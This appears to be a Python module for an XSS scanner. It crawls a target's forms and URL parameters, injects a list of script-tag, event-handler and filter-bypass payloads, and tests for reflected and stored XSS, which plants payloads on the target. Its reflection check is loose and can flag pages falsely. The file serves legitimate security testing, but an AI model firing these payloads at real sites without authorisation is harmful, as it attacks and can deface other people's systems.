"""
HTTP-based XSS Testing Module

This module performs XSS vulnerability testing using HTTP requests
without requiring browser automation.
"""

import logging
import requests
from typing import List, Dict, Any, Tuple
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
import re
import time

logger = logging.getLogger(__name__)


class XSSPayloadTester:
    """HTTP-based XSS vulnerability tester"""

    # XSS Test Payloads - ordered by severity
    PAYLOADS = [
        # Basic XSS payloads
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "<body onload=alert('XSS')>",
        "javascript:alert('XSS')",

        # Encoded payloads
        "%3Cscript%3Ealert('XSS')%3C/script%3E",
        "&#60;script&#62;alert('XSS')&#60;/script&#62;",

        # Event handler payloads
        "' onmouseover='alert(1)",
        "\" onload=\"alert(1)\"",

        # DOM-based payloads
        "<iframe src='javascript:alert(1)'>",
        "<input onfocus=alert(1) autofocus>",

        # Filter bypass payloads
        "<scr<script>ipt>alert(1)</scr</script>ipt>",
        "<ScRiPt>alert(1)</sCrIpT>",
        "<img src='x' onerror='alert(1)'>",

        # Advanced payloads
        "<svg><script>alert&#40;1&#41;</script>",
        "<math><mi xlink:href=\"data:x,<script>alert(1)</script>\">",
    ]

    # XSS Detection patterns in response
    DETECTION_PATTERNS = [
        r"<script>.*?alert.*?</script>",
        r"<img.*?onerror.*?>",
        r"<svg.*?onload.*?>",
        r"javascript:alert",
        r"onerror\s*=",
        r"onload\s*=",
        r"onfocus\s*=",
    ]

    def __init__(self, target_url: str, timeout: int = 10):
        """
        Initialize XSS tester

        Args:
            target_url: Target URL to test
            timeout: Request timeout in seconds
        """
        self.target_url = target_url
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'XSS-Assistant/0.1.0 (Security Testing)',
        })

    def discover_endpoints(self) -> List[Dict[str, Any]]:
        """
        Discover testable endpoints (forms, URL parameters)

        Returns:
            List of endpoint information
        """
        logger.info(f"Discovering endpoints on {self.target_url}")
        endpoints = []

        try:
            response = self.session.get(self.target_url, timeout=self.timeout)
            html = response.text

            # Find forms
            forms = self._parse_forms(html)
            endpoints.extend(forms)

            # Find URL parameters
            if '?' in self.target_url:
                params = self._parse_url_params(self.target_url)
                endpoints.append({
                    'type': 'url_parameter',
                    'url': self.target_url,
                    'parameters': params,
                    'method': 'GET'
                })

            logger.info(f"Discovered {len(endpoints)} endpoints")

        except Exception as e:
            logger.error(f"Endpoint discovery failed: {e}")

        return endpoints

    def _parse_forms(self, html: str) -> List[Dict[str, Any]]:
        """Parse HTML forms"""
        forms = []

        # Simple regex-based form parsing
        form_pattern = r'<form[^>]*>(.*?)</form>'
        form_matches = re.finditer(form_pattern, html, re.DOTALL | re.IGNORECASE)

        for match in form_matches:
            form_html = match.group(0)

            # Extract action
            action_match = re.search(r'action=["\']([^"\']*)["\']', form_html, re.IGNORECASE)
            action = action_match.group(1) if action_match else ''

            # Extract method
            method_match = re.search(r'method=["\']([^"\']*)["\']', form_html, re.IGNORECASE)
            method = method_match.group(1).upper() if method_match else 'GET'

            # Extract inputs
            input_pattern = r'<input[^>]*>'
            inputs = []
            for input_match in re.finditer(input_pattern, form_html, re.IGNORECASE):
                input_html = input_match.group(0)

                name_match = re.search(r'name=["\']([^"\']*)["\']', input_html, re.IGNORECASE)
                type_match = re.search(r'type=["\']([^"\']*)["\']', input_html, re.IGNORECASE)

                if name_match:
                    inputs.append({
                        'name': name_match.group(1),
                        'type': type_match.group(1) if type_match else 'text'
                    })

            if inputs:
                forms.append({
                    'type': 'form',
                    'action': urljoin(self.target_url, action),
                    'method': method,
                    'inputs': inputs
                })

        return forms

    def _parse_url_params(self, url: str) -> List[Dict[str, str]]:
        """Parse URL parameters"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        return [
            {'name': key, 'value': values[0] if values else ''}
            for key, values in params.items()
        ]

    def test_endpoint(self, endpoint: Dict[str, Any]) -> List[Dict[str, Any]]:
        """
        Test an endpoint with XSS payloads

        Args:
            endpoint: Endpoint information

        Returns:
            List of vulnerabilities found
        """
        vulnerabilities = []
        endpoint_type = endpoint.get('type')

        logger.info(f"Testing {endpoint_type}: {endpoint.get('action') or endpoint.get('url')}")

        if endpoint_type == 'form':
            vulnerabilities = self._test_form(endpoint)
        elif endpoint_type == 'url_parameter':
            vulnerabilities = self._test_url_params(endpoint)

        return vulnerabilities

    def _test_form(self, form: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Test form inputs with XSS payloads"""
        vulnerabilities = []

        action = form['action']
        method = form['method']
        inputs = form['inputs']

        for input_field in inputs:
            input_name = input_field['name']

            # Skip password fields for ethical reasons
            if input_field['type'].lower() == 'password':
                continue

            logger.info(f"Testing input: {input_name}")

            for payload in self.PAYLOADS[:5]:  # Test with first 5 payloads
                try:
                    # Prepare form data
                    data = {inp['name']: 'test' for inp in inputs}
                    data[input_name] = payload

                    # Send request
                    if method == 'POST':
                        response = self.session.post(action, data=data, timeout=self.timeout, allow_redirects=True)
                    else:
                        response = self.session.get(action, params=data, timeout=self.timeout, allow_redirects=True)

                    # Check if payload is reflected
                    if self._check_reflection(payload, response.text):
                        vulnerability = {
                            'type': 'reflected_xss',
                            'severity': 'high',
                            'endpoint': action,
                            'method': method,
                            'parameter': input_name,
                            'payload': payload,
                            'evidence': self._extract_evidence(payload, response.text),
                            'status_code': response.status_code
                        }
                        vulnerabilities.append(vulnerability)
                        logger.warning(f"XSS FOUND: {input_name} vulnerable to: {payload[:50]}")
                        break  # Found vulnerability, no need to test more payloads for this input

                    # Rate limiting
                    time.sleep(0.5)

                except Exception as e:
                    logger.error(f"Error testing {input_name} with payload: {e}")

        return vulnerabilities

    def _test_url_params(self, endpoint: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Test URL parameters with XSS payloads"""
        vulnerabilities = []

        url = endpoint['url']
        parameters = endpoint['parameters']

        for param in parameters:
            param_name = param['name']
            logger.info(f"Testing URL parameter: {param_name}")

            for payload in self.PAYLOADS[:5]:  # Test with first 5 payloads
                try:
                    # Parse URL and update parameter
                    parsed = urlparse(url)
                    params = parse_qs(parsed.query)
                    params[param_name] = [payload]

                    # Rebuild URL
                    new_query = urlencode(params, doseq=True)
                    test_url = parsed._replace(query=new_query).geturl()

                    # Send request
                    response = self.session.get(test_url, timeout=self.timeout, allow_redirects=True)

                    # Check if payload is reflected
                    if self._check_reflection(payload, response.text):
                        vulnerability = {
                            'type': 'reflected_xss',
                            'severity': 'high',
                            'endpoint': url,
                            'method': 'GET',
                            'parameter': param_name,
                            'payload': payload,
                            'evidence': self._extract_evidence(payload, response.text),
                            'status_code': response.status_code
                        }
                        vulnerabilities.append(vulnerability)
                        logger.warning(f"XSS FOUND: {param_name} vulnerable to: {payload[:50]}")
                        break

                    # Rate limiting
                    time.sleep(0.5)

                except Exception as e:
                    logger.error(f"Error testing {param_name} with payload: {e}")

        return vulnerabilities

    def _check_reflection(self, payload: str, response_text: str) -> bool:
        """
        Check if payload is reflected in response

        Args:
            payload: XSS payload
            response_text: HTTP response body

        Returns:
            True if payload found in response
        """
        # Direct match
        if payload in response_text:
            return True

        # Pattern-based detection
        for pattern in self.DETECTION_PATTERNS:
            if re.search(pattern, response_text, re.IGNORECASE):
                # Verify it contains our payload markers
                if 'XSS' in response_text or 'alert' in response_text:
                    return True

        return False

    def _extract_evidence(self, payload: str, response_text: str, context_chars: int = 100) -> str:
        """Extract evidence snippet from response"""
        try:
            idx = response_text.find(payload)
            if idx != -1:
                start = max(0, idx - context_chars)
                end = min(len(response_text), idx + len(payload) + context_chars)
                return response_text[start:end]
        except:
            pass
        return "Evidence extraction failed"

    def test_stored_xss(self, endpoint: Dict[str, Any]) -> List[Dict[str, Any]]:
        """
        Test for Stored (Persistent) XSS vulnerabilities

        Stored XSS occurs when user input is saved and later displayed
        without proper sanitization.

        Args:
            endpoint: Endpoint information

        Returns:
            List of stored XSS vulnerabilities found
        """
        vulnerabilities = []

        if endpoint.get('type') != 'form' or endpoint.get('method') != 'POST':
            return vulnerabilities

        action = endpoint['action']
        inputs = endpoint['inputs']

        logger.info(f"Testing for Stored XSS: {action}")

        # Use unique payloads to track persistence
        import uuid
        unique_id = str(uuid.uuid4())[:8]
        stored_payloads = [
            f"<script>alert('STORED-{unique_id}')</script>",
            f"<img src=x onerror=alert('STORED-{unique_id}')>",
        ]

        for input_field in inputs:
            input_name = input_field['name']

            # Skip password fields
            if input_field['type'].lower() == 'password':
                continue

            for payload in stored_payloads:
                try:
                    # Step 1: POST the payload
                    data = {inp['name']: 'test' for inp in inputs}
                    data[input_name] = payload

                    post_response = self.session.post(action, data=data, timeout=self.timeout, allow_redirects=True)
                    logger.debug(f"Posted payload to {input_name}")

                    # Step 2: GET the same page to check persistence
                    time.sleep(1)  # Allow time for storage
                    get_response = self.session.get(action, timeout=self.timeout)

                    # Step 3: Check if payload persists
                    if self._check_reflection(payload, get_response.text):
                        # Step 4: Verify it's actually stored (not just reflected)
                        # Make another GET request to confirm
                        time.sleep(0.5)
                        verify_response = self.session.get(action, timeout=self.timeout)

                        if self._check_reflection(payload, verify_response.text):
                            vulnerability = {
                                'type': 'stored_xss',
                                'severity': 'critical',  # Stored XSS is more severe
                                'endpoint': action,
                                'method': 'POST',
                                'parameter': input_name,
                                'payload': payload,
                                'evidence': self._extract_evidence(payload, verify_response.text),
                                'status_code': verify_response.status_code,
                                'unique_id': unique_id
                            }
                            vulnerabilities.append(vulnerability)
                            logger.error(f"STORED XSS FOUND: {input_name} - Payload persists across requests!")
                            break  # Found stored XSS, no need to test more payloads

                    # Rate limiting
                    time.sleep(0.5)

                except Exception as e:
                    logger.error(f"Error testing stored XSS on {input_name}: {e}")

        return vulnerabilities

    def run_full_scan(self) -> Dict[str, Any]:
        """
        Run complete XSS scan (both reflected and stored)

        Returns:
            Scan results with all vulnerabilities found
        """
        logger.info(f"Starting full XSS scan on {self.target_url}")

        results = {
            'target': self.target_url,
            'endpoints_found': 0,
            'endpoints_tested': 0,
            'vulnerabilities': [],
            'stored_xss_tested': 0,
            'status': 'completed'
        }

        try:
            # Discover endpoints
            endpoints = self.discover_endpoints()
            results['endpoints_found'] = len(endpoints)

            # Test each endpoint for reflected XSS
            for endpoint in endpoints:
                vulnerabilities = self.test_endpoint(endpoint)
                results['vulnerabilities'].extend(vulnerabilities)
                results['endpoints_tested'] += 1

                # Also test for stored XSS on POST forms
                if endpoint.get('method') == 'POST':
                    stored_vulns = self.test_stored_xss(endpoint)
                    results['vulnerabilities'].extend(stored_vulns)
                    results['stored_xss_tested'] += 1

            logger.info(f"Scan completed: {len(results['vulnerabilities'])} vulnerabilities found")

        except Exception as e:
            logger.error(f"Scan failed: {e}")
            results['status'] = 'failed'
            results['error'] = str(e)

        return results
